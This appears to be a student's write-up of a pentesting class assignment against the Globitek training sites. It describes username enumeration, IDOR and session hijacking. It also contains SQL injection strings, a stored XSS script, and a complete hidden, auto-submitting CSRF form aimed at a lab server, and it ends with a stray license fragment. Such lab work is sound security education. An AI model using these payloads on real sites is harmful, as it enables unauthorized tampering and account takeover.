# Project 8 - Pentesting Live Targets

Time spent: **8** hours spent in total

> Objective: Identify vulnerabilities in three different versions of the Globitek website: blue, green, and red.

The six possible exploits are:
* Username Enumeration
* Insecure Direct Object Reference (IDOR)
* SQL Injection (SQLi)
* Cross-Site Scripting (XSS)
* Cross-Site Request Forgery (CSRF)
* Session Hijacking/Fixation

Each version of the site has been given two of the six vulnerabilities. (In other words, all six of the exploits should be assignable to one of the sites.)

## Blue

Vulnerability #1: SQL Injection
- [x] GIF Walkthrough:<img src='https://i.imgur.com/xmFZg6V.gif' title='SQL injection' width='' alt='SQL injection' />
Using sqlmap in Kali Linux, I found the id perimeter of blue site to be vulnerable to injection and it recommended some payloads.
I tried using id=' OR 1=1--' which just redirected me to salesperson main info page. Then I decided to use a different time based
injection: id = ' OR SLEEP(10)=0--' to cause a delay when I do a query.

Vulnerability #2: Session Hijacking/Fixation
- [x] GIF Walkthrough:<img src='https://i.imgur.com/R8eYoUK.gif' title='Session Hijacking' width='' alt='Session Hijacking' />
In the right side I opened blue site in google chrome and on the left its open in Mozilla Firefox. I logged in Google Chrome and
found the session id by using the php script provided at public/hacktools/change_session_id.php domain. I used the session id from
authenticated Google Chrome site and turned on intercept mode in Burp. Then I forwarded the authenticated session id when I clicked on
login in Mozilla Firefox blue site to gain access.

## Green

Vulnerability #1: Username enumeration
- [x] GIF Walkthrough:<img src='https://i.imgur.com/pzFQLrs.gif' title='Username enumeration' width='' alt='Username enumeration' />
I noticed for the green targets there was a difference when I used a legitimate username name vs
using some arbitrary fake username and tried to login using incorrect details, the legit username
shows a bold "Log in was unsuccessful" compared to fake username login attempt. Using inspect element
it can be seen the login unsuccessful prompt are shown by two different classes: failed and failure with
failure class being used for legitimate username.

Vulnerability #2: Cross-Site Scripting
- [x] GIF Walkthrough:<img src='https://i.imgur.com/So7gsZa.gif' title='Cross-Site Scripting' width='' alt='Cross-Site Scripting' />
I submitted the example script in the comment section: <script>alert('Gurmehar found the XSS!');</script> for all sites
Green site was the only one that executed the stored XSS attack.


## Red

Vulnerability #1: Insecure Direct Object Reference
- [x] GIF Walkthrough:<img src='https://i.imgur.com/7HjxGfv.gif' title='Insecure Direct Object Reference' width='' alt='Insecure Direct Object Reference' />
All the sites have organized the salesperson by id in url and in the Red target the last salesperson id is supposed to be 9.
However, if you try an id number higher than that it should technically be invalid as that employee isn't listed on website
but in this case you can see employee details who aren't listed under the salesperson tab.

Vulnerability #2: Cross-Site Request Forgery (CSRF)
- [x] GIF Walkthrough:<img src='https://i.imgur.com/0BejN3o.gif' title='Cross-Site Request Forgery' width='' alt='Cross-Site Request Forgery' />
For this exploit, I submitted a fake form executing a post request and changing the salesperson info. The code is shown Below
which was based on the bank_form CSRF example from Week 4. The code basically submits the request on loading of the page and hides
the result in hidden iframe.
```html
<html>

<head>
  <title>CSRF Form</title>
</head>

<body onload="document.really_cool_form.submit()">
  <form action='https://35.194.21.71/red/public/staff/salespeople/edit.php?id=7' method="POST" name="really_cool_form" style="display: none;" target="hidden_results">
    <input type="text" name="first_name" value="YOU_GOT_HACKED" />
    <input type="text" name="last_name" value="BY_GURMEHAR" />
    <input type="text" name="phone" value="555-555-5555" />
    <input type="text" name="email" value="fake@email.com" />

  </form>
  <iframe name="hidden_results" style="display: none;"></iframe>
</body>

</html>
```

## Notes

Describe any challenges encountered while doing the work
Overall this was a good review of all the things we have learned so far. The main challenge was just finding out which site was exploitable
but as I went down the list it became fairly straightforward. I did had to research other forms of SQL injection to see immediate difference.
CSRF exploit was my favorite to do because it required some external script to exploit. This was a fun assignment.
governing permissions and
limitations under the License.
